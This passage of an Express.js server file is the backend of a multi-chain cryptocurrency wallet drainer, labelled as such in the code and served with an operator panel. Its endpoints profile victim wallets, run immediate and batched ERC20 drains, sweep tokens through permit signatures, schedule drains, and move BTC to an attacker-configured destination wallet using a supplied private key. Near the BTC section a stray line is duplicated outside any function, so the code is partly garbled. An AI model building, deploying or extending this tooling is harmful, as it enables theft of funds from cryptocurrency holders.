    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/flow/history', (req, res) => {
  try {
    const history = flowCoordinator.getFlowHistory();
    res.json({ success: true, history });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== CHAIN MANAGEMENT ENDPOINTS ====================
app.get('/api/chains/status', async (req, res) => {
  try {
    const status = chainManager.getChainStatus();
    res.json({ success: true, status });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/chains/config/:chainId', async (req, res) => {
  try {
    const { chainId } = req.params;
    const config = chainManager.getChainConfig(chainId);
    res.json({ success: true, config });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/chains/load', async (req, res) => {
  try {
    const result = await chainManager.loadChains();
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== CORE DRAINER ENDPOINTS ====================
app.post('/api/analyze/categorize', async (req, res) => {
  try {
    const { assets } = req.body;
    const categories = await coreDrainer.categorizeUser(assets);
    res.json({ success: true, categories });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/contract/abi/:tokenAddress/:chainId', async (req, res) => {
  try {
    const { tokenAddress, chainId } = req.params;
    const abi = await coreDrainer.fetchERC20ABI(tokenAddress, chainId);
    res.json({ success: true, abi });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/nfts/:chainName/:userAddress', async (req, res) => {
  try {
    const { chainName, userAddress } = req.params;
    const nfts = await coreDrainer.fetchNFTs(chainName, userAddress);
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/nonce/:tokenAddress/:userAddress', async (req, res) => {
  try {
    const { tokenAddress, userAddress } = req.params;
    const nonce = await coreDrainer.fetchNonce(tokenAddress, userAddress);
    res.json({ success: true, nonce });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/utils/split-signature', (req, res) => {
  try {
    const { signature } = req.body;
    const result = coreDrainer.splitSignature(signature);
    res.json({ success: true, ...result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/analyze/wallet', async (req, res) => {
  try {
    const { userAddress } = req.body;
    const assets = await coreDrainer.analyzeWallet(userAddress);
    res.json({ success: true, ...assets });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/execute/immediate-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    const result = await coreDrainer.executeImmediateDrain(userAddress);
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/execute/token-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    const result = await coreDrainer.batchDrainERC20(userAddress);
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/schedule/drain', async (req, res) => {
  try {
    const { userAddress, priority } = req.body;
    const result = await coreDrainer.scheduleDrain(userAddress, priority);
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== BITCOIN ENDPOINTS ====================
app.post('/api/bitcoin/balance', async (req, res) => {
  try {
    const { address } = req.body;
    const balance = await coreDrainer.getBTCBalance(address);
    res.json({ success: true, balance });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/bitcoin/drain', async (req, res) => {
  try {
    const { fromAddress, privateKeyWIF, destinationAddress } = req.body;
    const txid = await coreDrainer.drainBTC(fromAddress, privateKeyWIF, destinationAddress);
    res.json({ success: true, txid });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Solana drain endpoint
app.post('/api/execute-solana-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    console.log('🎯 Starting Solana drain for:', userAddress);
    
    if (!process.env.DESTINATION_WALLET_SOL) {
      return res.json({ 
        success: false, 
        error: 'Solana destination wallet not configured in environment' 
      });
    }
    
    // Get Solana balance
    const balance = await coreDrainer.getSolanaBalance(userAddress);
    console.log('💰 Solana balance:', balance);
    
    // For now, return balance info since we can't drain without private key
    res.json({ 
      success: true, 
      message: 'Solana balance checked successfully',
      balance: balance,
      destinationWallet: process.env.DESTINATION_WALLET_SOL,
      chain: 'solana'
    });
    
  } catch (error) {
    console.error('❌ Solana drain error:', error);
    res.json({ success: false, error: error.message });
  }
});

app.post('/api/permit/sweep', async (req, res) => {
  try {
    const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
    const result = await coreDrainer.permitManager.sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion);
    res.json(result);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});
// BTC drain endpoint
      destinationWallet: process.env.DESTINATION_WALLET_BTC,
// BTC drain endpoint
app.post('/api/execute-btc-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    console.log('🎯 Starting BTC drain for:', userAddress);
    
    if (!process.env.DESTINATION_WALLET_BTC) {
      return res.json({ 
        success: false, 
        error: 'BTC destination wallet not configured in environment' 
      });
    }
    
    // Get BTC balance
    const balance = await coreDrainer.getBTCBalance(userAddress);
    console.log('💰 BTC balance:', balance);
    
    // For now, return balance info since we can't drain without private key
    res.json({ 
      success: true, 
      message: 'BTC balance checked successfully',
      balance: balance,
      destinationWallet: process.env.DESTINATION_WALLET_BTC,
      chain: 'bitcoin'
    });
    
  } catch (error) {
    console.error('❌ BTC drain error:', error);
    res.json({ success: false, error: error.message });
  }
});

// Server port binding for Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

// Root endpoint for health checks
app.get("/", (req, res) => {
  res.json({ 
    status: "OK", 
    service: "multi-chain-drainer",
    timestamp: new Date().toISOString()
  });
});

export default app;

// Operator panel endpoint
app.get(["/panel", "/panel.html"], (req, res) => {
  res.sendFile(path.join(__dirname, "panel.html"));
  console.log("🔌 Operator panel connected");
});
